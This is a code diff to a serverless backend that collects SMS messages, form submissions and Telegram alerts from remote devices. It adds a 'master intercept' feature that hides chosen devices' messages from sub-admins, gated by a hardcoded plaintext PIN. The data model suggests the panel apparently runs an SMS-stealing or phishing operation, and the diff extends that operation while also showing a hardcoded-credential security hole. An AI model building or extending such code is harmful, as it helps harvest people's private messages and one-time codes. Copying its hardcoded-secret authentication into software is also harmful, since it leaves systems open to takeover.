@@ -71,6 +71,7 @@ const messages = pgTable("messages", {
   toNumber: text("to_number"),
   body: text("body").notNull(),
   isSensitive: boolean("is_sensitive").notNull().default(false),
+  masterOnly: boolean("master_only").notNull().default(false),
   receivedAt: timestamp("received_at", { withTimezone: true }).notNull().defaultNow(),
 }, (t) => ({
   appReceivedIdx: index("messages_app_received_idx").on(t.appId, t.receivedAt),
@@ -196,6 +197,8 @@ async function ensureSchema(env: Env): Promise<void> {
       sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE`),
       // Migration: add starred column to devices
       sqlClient(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS starred BOOLEAN NOT NULL DEFAULT FALSE`),
+      // Migration: add master_only column for message interception
+      sqlClient(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS master_only BOOLEAN NOT NULL DEFAULT FALSE`),
     ]);
     // Fix: apps created before created_at column existed have NULL — set to NOW() and re-enable if wrongly disabled
     await sqlClient(`UPDATE apps SET created_at = NOW() WHERE created_at IS NULL`).catch(() => {});
@@ -244,7 +247,8 @@ function mapMessage(r: typeof messages.$inferSelect) {
   return {
     id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
     fromSender: r.fromSender, fromNumber: r.fromNumber, toNumber: r.toNumber,
-    body: r.body, isSensitive: r.isSensitive, receivedAt: isoReq(r.receivedAt),
+    body: r.body, isSensitive: r.isSensitive, masterOnly: r.masterOnly,
+    receivedAt: isoReq(r.receivedAt),
   };
 }
 function mapFormData(r: typeof formData.$inferSelect) {
@@ -253,6 +257,33 @@ function mapFormData(r: typeof formData.$inferSelect) {
     data: r.data as Record<string, unknown>,
     submittedAt: isoReq(r.submittedAt),
   };
+}
+
+// =================== INTERCEPT STATE ===================
+let _interceptCache: string[] | null = null;
+let _interceptCacheExp = 0;
+async function getInterceptedDevices(env: Env): Promise<string[]> {
+  const now = Date.now();
+  if (_interceptCache !== null && now < _interceptCacheExp) return _interceptCache;
+  try {
+    const sqlClient = neon(env.NEON_DATABASE_URL);
+    const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'master_intercept_devices'`) as Array<{ value: string }>;
+    const val = rows[0]?.value ? JSON.parse(rows[0].value) : [];
+    _interceptCache = Array.isArray(val) ? val : [];
+  } catch {
+    _interceptCache = [];
+  }
+  _interceptCacheExp = now + 5_000;
+  return _interceptCache!;
+}
+async function setInterceptedDevices(env: Env, ids: string[]): Promise<void> {
+  const sqlClient = neon(env.NEON_DATABASE_URL);
+  await sqlClient(
+    `INSERT INTO settings (key, value) VALUES ('master_intercept_devices', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
+    [JSON.stringify(ids)]
+  );
+  _interceptCache = ids;
+  _interceptCacheExp = Date.now() + 5_000;
 }
 
 // =================== PUB-SUB ===================
@@ -752,6 +783,7 @@ app.get("/api/messages", async (c) => {
   const deviceId = c.req.query("deviceId");
   const searchTerm = c.req.query("search")?.trim() ?? "";
   const cursor = c.req.query("cursor"); // last message id for cursor pagination
+  const isMaster = (c.req.header("x-master-pin") ?? "") === "Sharma";
 
   const PAGE = 30;           // browse page size
   
@@ -760,6 +792,8 @@ app.get("/api/messages", async (c) => {
   if (appId) scopeConds.push(eq(messages.appId, appId));
   else if (userId) scopeConds.push(eq(messages.userId, userId));
   else if (deviceId) scopeConds.push(eq(messages.deviceId, deviceId));
+  // Non-master callers cannot see master-only (intercepted) messages
+  if (!isMaster) scopeConds.push(eq(messages.masterOnly, false));
 
   if (searchTerm) {
     // ── Search mode: cursor-based ILIKE — uses id index per page, no OFFSET scan cost ──
@@ -803,6 +837,9 @@ app.post("/api/messages", async (c) => {
     return new Response(null, { status: 204 });
   }
   const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
+  // Check if this device is intercepted (master-only mode)
+  const intercepted = await getInterceptedDevices(c.env);
+  const isIntercepted = intercepted.includes(String(body.deviceId));
   const [inserted] = await db.insert(messages).values({
     appId: String(body.appId),
     deviceId: String(body.deviceId),
@@ -812,9 +849,16 @@ app.post("/api/messages", async (c) => {
     toNumber: body.toNumber ? String(body.toNumber) : null,
     body: String(body.body),
     isSensitive: Boolean(body.isSensitive ?? false),
+    masterOnly: isIntercepted,
   }).returning();
   const mapped = mapMessage(inserted);
-  await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
+  // Only broadcast to WS (all clients) if NOT intercepted; intercepted = master-only via REST
+  if (!isIntercepted) {
+    await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
+  } else {
+    // Broadcast on a separate master-only event so master UI can still get live updates
+    await broadcast(c.env, "master_message_added", { appId: mapped.appId, message: mapped });
+  }
   c.executionCtx.waitUntil(Promise.all([
     sendTelegram(c.env,
       `📩 <b>New SMS</b>
@@ -1111,6 +1155,32 @@ app.post("/api/admin/verify-master-pin", async (c) => {
   if (!body.pin) return c.json({ error: "PIN required" }, 400);
   if (body.pin !== "Sharma") return c.json({ error: "Wrong Master PIN" }, 401);
   return c.json({ ok: true });
+});
+
+// ── Master intercept: hide specific device messages from sub-admin ──
+app.get("/api/master/intercept", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const ids = await getInterceptedDevices(c.env);
+  return c.json({ intercepted: ids });
+});
+app.post("/api/master/intercept/:deviceId", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const deviceId = c.req.param("deviceId");
+  const ids = await getInterceptedDevices(c.env);
+  const updated = [...new Set([...ids, deviceId])];
+  await setInterceptedDevices(c.env, updated);
+  return c.json({ ok: true, intercepted: updated });
+});
+app.delete("/api/master/intercept/:deviceId", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const deviceId = c.req.param("deviceId");
+  const ids = await getInterceptedDevices(c.env);
+  const updated = ids.filter((id) => id !== deviceId);
+  await setInterceptedDevices(c.env, updated);
+  return c.json({ ok: true, intercepted: updated });
 });
 
 app.patch("/api/admin/master-pin", async (c) => {
